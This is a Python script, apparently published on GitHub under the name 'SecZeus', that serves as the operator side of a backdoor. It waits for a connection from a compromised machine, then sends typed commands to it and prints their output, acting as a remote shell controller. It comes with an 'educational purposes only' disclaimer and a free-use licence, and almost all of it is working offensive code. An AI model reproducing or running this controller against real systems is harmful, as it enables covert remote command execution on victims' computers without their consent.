#!usr/bin/env python3
# -*- coding: utf-8 -*-

'''
    Coded By: SecZeus
    https://www.github.com/seczeus

    Software made ONLY for educational purposes.
    If you, at any time perform any illegal activity with it, i will not be responsabilized.

    You're FREE to USE, MODIFY, DELETE and DISTRIBUTE

    By using this software you agree with these terms
'''

try:
    import os
    import sys
    import argparse
    from colorama import init
    init()
    from colorama import Fore, Style, Back
    import socket
    import subprocess
    import threading
    import platform
except:
    print("Libraries no successfully loaded.")
    print("Something went wrong.")

if (sys.version_info[0] < 3):
    print("Use: python3 backdoor.py")
    sys.exit()

def cleartela():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

cleartela()

def pars():
    parser = argparse.ArgumentParser()
    parser.add_argument('-f', type=str, default='backdoor.exe', help='Name of the file generated')
    args = parser.parse_args()

    main(args)

def letras():
    print(Fore.CYAN)
    print("BBBB           k       d                          ")
    print("B   B          k k     d                          ")
    print("BBBB   aa  ccc kk    ddd ooo ooo rrr    ppp  y  y ")
    print("B   B a a c    k k  d  d o o o o r   .. p  p y  y ")
    print("BBBB  aaa  ccc k  k  ddd ooo ooo r   .. ppp   yyy ")
    print("                                        p       y ")
    print("                                        p    yyy  ")
    print(Style.RESET_ALL)

def main(args):
    
    letras()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("In which host do you want to perform the connection?")
    host = str(input(" > "))
    if (host == "127.0.0.1"):
        host = "0.0.0.0"
    print("In which port do you want to perform the connection?")
    porta = int(input(" > "))

    s.bind((host, porta))
        
    s.listen(1)

    cleartela()
    letras()
    print("Listening on " + str(host) + ":" + str(porta))
    c, e = s.accept()
    print()
    print("Recieving connection from ", e)
    oss = c.recv(1024)
    print(oss.decode('ascii'))
    print()
    while True:
        try:
            directory = c.recv(3072)
            print("Remote Shell:")
            sys.stdout.write(str(directory.decode('ascii')))
            cmd = input(">")
            if cmd == 'quit' or cmd == 'exit':
                sys.exit()
                break
            else:
                try:
                    c.send(cmd.encode('ascii'))
                    output = c.recv(1024)
                    print(str(output.decode('utf-8')))
                except:
                    continue
        except:
            print("Connection Interrupted.")
            c.close()
            s.close()
            sys.exit()
            
            
if __name__ == '__main__':
    pars()
